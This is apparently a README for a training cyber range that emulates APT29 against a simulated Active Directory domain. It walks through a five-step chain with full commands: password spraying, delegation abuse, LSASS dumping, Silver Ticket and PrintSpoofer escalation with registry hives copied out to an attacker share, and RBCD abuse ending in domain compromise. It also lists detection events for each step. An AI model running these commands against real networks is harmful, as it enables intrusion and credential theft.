# Operation SHATTERED CROWN — Active Directory Delegation Cyber Range

**Classification:** UNCLASSIFIED // EXERCISE ONLY
**Domain Theme:** Corporate Enterprise — Financial Services AD Infrastructure\
**Network:** cyberange.local (simulated)\
**Platform:** Windows Server 2019 — OpenStack / QEMU-KVM\
**APT Emulation:** APT29 (Cozy Bear / Midnight Blizzard / NOBELIUM)

---

## Machine Summary

| # | Hostname | Role | Vulnerability | MITRE ATT&CK |
|---|----------|------|---------------|---------------|
| M1 | DC02 | Domain Controller (AD DS + DNS) | Weak password policy (no lockout), RBCD misconfiguration on computer object | T1110.003, T1098 |
| M2 | SRV04-WEB | IIS Web Frontend | Password spray target — svc_web runs app pool with weak domain password | T1110.003 |
| M3 | SRV05-API | WinRM API Backend | Constrained Delegation target — svc_web delegates to HTTP/SRV05-API | T1550.003, T1558 |
| M4 | SRV06-OPT | Operations Server | LSASS unprotected (no RunAsPPL, WDigest enabled), cached svc_sql session | T1003.001, T1550.002 |
| M5 | SRV07-SQL | MSSQL Database | xp_cmdshell enabled, SeImpersonatePrivilege on svc_sql, SRV07-SQL$ has GenericWrite on DC02 | T1558.002, T1134 |

---

## Credential Chain

```
M2 Password Spray  →  svc_web : Summer2025!
M3 S4U2Proxy       →  Impersonate Administrator@CIFS/SRV05-API  →  Local Admin hash
M4 LSASS Dump      →  svc_sql NT hash + backup_admin hash (DA)
M5 Silver Ticket   →  MSSQLSvc/SRV07-SQL:1433  →  xp_cmdshell  →  PrintSpoofer  →  SYSTEM  →  SRV07-SQL$ machine hash
M1 RBCD Abuse      →  SRV07-SQL$ GenericWrite on DC02  →  S4U  →  Domain Admin  →  Full DCSync
```

---

## Attack Flow (5 Steps)

### Step 1 — Password Spray (SRV04-WEB → DC02)

The domain password policy has no account lockout threshold. The attacker enumerates domain users via RID brute-force against SMB, then sprays a list of seasonal passwords against all accounts. `svc_web` falls to `Summer2025!`.

**Tools:** kerbrute, nxc, impacket-getTGT
**Detection:** Event 4771 (Kerberos pre-auth failures) in bulk on DC02, followed by a single 4768 (TGT success) for svc_web.

```bash
# Enumerate users
nxc smb <DC_IP> -u '' -p '' --rid-brute

# Spray
kerbrute -users users.txt -passwords passwords.txt -domain cyberange.local -dc-ip <DC_IP>

# Validate
impacket-getTGT 'cyberange.local/svc_web:Summer2025!' -dc-ip <DC_IP>
```

---

### Step 2 — S4U2Self / S4U2Proxy Delegation Abuse (→ SRV05-API)

`svc_web` has constrained delegation configured to `HTTP/SRV05-API.cyberange.local` with protocol transition enabled (`TrustedToAuthForDelegation`). The attacker uses `impacket-getST` to request a service ticket impersonating Administrator, then uses `-altservice` to rewrite the SPN to `CIFS/SRV05-API`. This gives full SMB access as Administrator on SRV05-API without knowing the Administrator password.

**Tools:** impacket-getST, impacket-secretsdump
**Detection:** Event 4769 on DC02 with delegation flags set. Event 4624 Type 3 on SRV05-API showing Administrator logon from unexpected source.

```bash
# S4U chain — impersonate DA, rewrite SPN to CIFS
impacket-getST 'cyberange.local/svc_web:Summer2025!' \
  -spn 'HTTP/SRV05-API.cyberange.local' \
  -impersonate Administrator \
  -altservice 'CIFS/SRV05-API.cyberange.local' \
  -dc-ip <DC_IP>

# Use the ticket
export KRB5CCNAME=<ticket>.ccache

# Dump SAM/LSA from SRV05-API
impacket-secretsdump -k -no-pass 'cyberange.local/Administrator@SRV05-API.cyberange.local'
```

**Output:** Local Administrator NT hash (e.g. `aad3b435b51404eeaad3b435b51404ee:<HASH>`). This hash is shared across SRV05-API, SRV06-OPT, and SRV07-SQL (common in orgs that image servers from the same template).

---

### Step 3 — Lateral Movement + LSASS Credential Dump (→ SRV06-OPT)

The attacker passes the local Administrator hash from Step 2 to authenticate to SRV06-OPT via SMB (`--local-auth`). SRV06-OPT has LSASS protections disabled (no RunAsPPL, no Credential Guard, WDigest UseLogonCredential=1). Two scheduled tasks run on SRV06-OPT as domain accounts — `CorpOpsHealthMonitor` as `svc_sql` and `CorpBackupAgent` as `backup_admin` (DA). Both accounts have active logon sessions cached in LSASS.

**Tools:** nxc (lsassy module), impacket-wmiexec, impacket-secretsdump
**Detection:** Event 4624 Type 3 with local admin account on SRV06-OPT. Sysmon Event 10 (LSASS process access). Event 4688 process creation for procdump/minidump patterns.

```bash
# Verify PTH access
nxc smb SRV06-OPT.cyberange.local -u Administrator -H '<LOCAL_ADMIN_HASH>' --local-auth

# Dump LSASS
nxc smb SRV06-OPT.cyberange.local -u Administrator -H '<LOCAL_ADMIN_HASH>' --local-auth -M lsassy
```

**Output:** `svc_sql` NT hash and optionally cleartext password. Also `backup_admin` DA hash (bonus forensic artifact for blue team).

---

### Step 4 — Silver Ticket + MSSQL + PrintSpoofer Privilege Escalation (→ SRV07-SQL)

The attacker forges a Silver Ticket for `MSSQLSvc/SRV07-SQL.cyberange.local:1433` using the `svc_sql` NT hash. This ticket authenticates directly to SQL Server without touching the DC — no Event 4769 generated on DC02 (the hallmark of Silver Ticket attacks). The attacker connects to MSSQL, executes `xp_cmdshell` as `svc_sql`, uploads `PrintSpoofer64.exe` via an authenticated SMB server on the attacker machine, then escalates to SYSTEM using `SeImpersonatePrivilege`. As SYSTEM, registry hives (SAM, SYSTEM, SECURITY) are dumped and exfiltrated. The SECURITY hive contains the `SRV07-SQL$` machine account NT hash.

**Tools:** impacket-ticketer, impacket-mssqlclient, impacket-smbserver, PrintSpoofer64.exe, impacket-secretsdump
**Detection:** SRV07-SQL Event 4624 with **no corresponding 4769 on DC02** — the smoking gun of a Silver Ticket. Event 4688 for PrintSpoofer and reg.exe process creation. xp_cmdshell activity in SQL Server audit logs.

```bash
# Forge Silver Ticket
impacket-ticketer -nthash '<SVC_SQL_HASH>' \
  -domain-sid '<DOMAIN_SID>' \
  -domain cyberange.local \
  -spn 'MSSQLSvc/SRV07-SQL.cyberange.local:1433' \
  -dc-ip <DC_IP> Administrator

export KRB5CCNAME=Administrator.ccache

# Connect to MSSQL
impacket-mssqlclient -k -no-pass 'cyberange.local/Administrator@SRV07-SQL.cyberange.local' -windows-auth

# Inside SQL:
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'whoami /priv';

# Upload PrintSpoofer via SMB (on attacker: impacket-smbserver -smb2support -username att -password att share /opt/redteam/tools/)
EXEC xp_cmdshell 'net use \\<ATTACKER_IP>\share /user:att att';
EXEC xp_cmdshell 'copy \\<ATTACKER_IP>\share\PrintSpoofer64.exe C:\Windows\Temp\PrintSpoofer64.exe /Y';

# Escalate to SYSTEM
EXEC xp_cmdshell 'C:\Windows\Temp\PrintSpoofer64.exe -i -c "cmd /c reg save HKLM\SAM C:\Windows\Temp\sam.save /y"';
EXEC xp_cmdshell 'C:\Windows\Temp\PrintSpoofer64.exe -i -c "cmd /c reg save HKLM\SYSTEM C:\Windows\Temp\system.save /y"';
EXEC xp_cmdshell 'C:\Windows\Temp\PrintSpoofer64.exe -i -c "cmd /c reg save HKLM\SECURITY C:\Windows\Temp\security.save /y"';

# Exfiltrate hives back to attacker SMB
EXEC xp_cmdshell 'C:\Windows\Temp\PrintSpoofer64.exe -i -c "cmd /c copy C:\Windows\Temp\sam.save \\<ATTACKER_IP>\share\sam.save /Y"';
EXEC xp_cmdshell 'C:\Windows\Temp\PrintSpoofer64.exe -i -c "cmd /c copy C:\Windows\Temp\system.save \\<ATTACKER_IP>\share\system.save /Y"';
EXEC xp_cmdshell 'C:\Windows\Temp\PrintSpoofer64.exe -i -c "cmd /c copy C:\Windows\Temp\security.save \\<ATTACKER_IP>\share\security.save /Y"';

# Parse offline
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
```

**Output:** `SRV07-SQL$` machine account NT hash from `$MACHINE.ACC` in the SECURITY hive.

---

### Step 5 — RBCD Abuse → Domain Admin (→ DC02)

`SRV07-SQL$` has `GenericWrite` on DC02's computer object — a misconfiguration from when the SQL server was granted permissions for automated patching. The attacker uses the machine hash to write `msDS-AllowedToActOnBehalfOfOtherIdentity` on DC02, configuring Resource-Based Constrained Delegation (RBCD). A new machine account `COMP$` is created (default MachineAccountQuota=10 allows this), then S4U2Self/S4U2Proxy is used to impersonate Administrator on DC02 via `CIFS/DC02`. This yields a Kerberos ticket that grants full Domain Admin access. The attacker runs `secretsdump` against DC02 to extract every credential in the domain.

**Tools:** impacket-addcomputer, impacket-rbcd, impacket-getST, impacket-secretsdump, impacket-wmiexec
**Detection:** Event 4741 (computer account creation) on DC02. Event 5136 (directory service object modified — msDS-AllowedToActOnBehalfOfOtherIdentity). Event 4769 with S4U flags. Event 4624 Type 3 for Administrator from unexpected source.

```bash
# Create machine account
impacket-addcomputer 'cyberange.local/svc_web:Summer2025!' \
  -computer-name 'COMP$' -computer-pass 'FakeP@ss123!' -dc-ip <DC_IP>

# Write RBCD attribute using SRV07-SQL$ machine hash
impacket-rbcd 'cyberange.local/SRV07-SQL$' \
  -hashes ':<SRV07_MACHINE_HASH>' \
  -delegate-to 'DC02$' \
  -delegate-from 'COMP$' \
  -action write -dc-ip <DC_IP>

# S4U to get DA ticket
impacket-getST 'cyberange.local/COMP$:FakeP@ss123!' \
  -spn 'CIFS/DC02.cyberange.local' \
  -impersonate Administrator -dc-ip <DC_IP>

export KRB5CCNAME=Administrator@CIFS_DC02.cyberange.local@CYBERANGE.LOCAL.ccache

# Verify DA
impacket-wmiexec -k -no-pass 'cyberange.local/Administrator@DC02.cyberange.local' \
  'whoami && hostname && net group "Domain Admins" /domain'

# Full domain dump
impacket-secretsdump -k -no-pass 'cyberange.local/Administrator@DC02.cyberange.local'
```

**Output:** Every domain credential — NTDS.dit contents including all user hashes, machine account hashes, and Kerberos keys. Full domain compromise.

---

## Setup Order

Setup is done via PowerShell scripts on each machine. Run in this order:

```
1. M1-DC02    — Domain Controller (must be first — creates the forest)
2. M2-SRV04-WEB — Join domain, install IIS
3. M3-SRV05-API — Join domain, enable WinRM, register HTTP SPN
4. M4-SRV06-OPT — Join domain, disable LSASS protections, create cached sessions
5. M5-SRV07-SQL — Join domain, install SQL Server, enable xp_cmdshell
6. M1-DC02 (again) — Run post-join script: configure RBCD ACL on DC02 computer object
```

Per-machine:
```powershell
# On each VM (as Administrator):
Set-ExecutionPolicy Bypass -Scope Process -Force
.\setup.ps1
```

---

## OpenStack Network Assignment

All 5 machines reside on a single flat network segment. The DC provides DNS and DHCP-registered names. No multi-NIC or DMZ segmentation — this simulates a typical corporate LAN where lateral movement is trivial once you have credentials.

| Machine | Network | Notes |
|---------|---------|-------|
| DC02 | lab-net | DNS server, AD DS, DHCP-registered IP |
| SRV04-WEB | lab-net | IIS on port 80 |
| SRV05-API | lab-net | WinRM on port 5985 |
| SRV06-OPT | lab-net | SMB on port 445 |
| SRV07-SQL | lab-net | MSSQL on port 1433 |

---

## APT29 Technique Mapping

This range emulates a subset of APT29 (Midnight Blizzard) tradecraft observed in the 2024 Microsoft corporate breach and historical SolarWinds/NOBELIUM campaigns. APT29 is attributed to Russia's Foreign Intelligence Service (SVR) and is known for:

- Large-scale password spraying against service accounts (CISA AA24-057A)
- Kerberos ticket manipulation for lateral movement (Mandiant "No Easy Breach")
- Identity-centric post-exploitation — Golden SAML, MagicWeb, delegation abuse
- Long-dwell operations prioritizing credential harvesting over destructive action

| Step | Technique | MITRE ID | APT29 Precedent |
|------|-----------|----------|-----------------|
| 1 | Password Spraying | T1110.003 | Microsoft breach 2024 — spray against legacy service account |
| 2 | Steal/Forge Kerberos Tickets | T1558 | SolarWinds — Golden SAML, forged authentication tokens |
| 3 | OS Credential Dumping: LSASS | T1003.001 | Standard post-compromise credential harvesting |
| 4 | Silver Ticket | T1558.002 | Capability inference — APT29 tooling supports Kerberos forgery |
| 5 | Account Manipulation | T1098 | NOBELIUM — modification of trust/delegation attributes |

---

## GitHub Push

```bash
git init Red-Range2
cd Red-Range2
cp -r /path/to/extracted/* .
git add .
git commit -m "Operation SHATTERED CROWN - Initial Release"
git remote add origin https://github.com/hacktifytechnologies/Red-Range2.git
git branch -M main
git push -u origin main
```
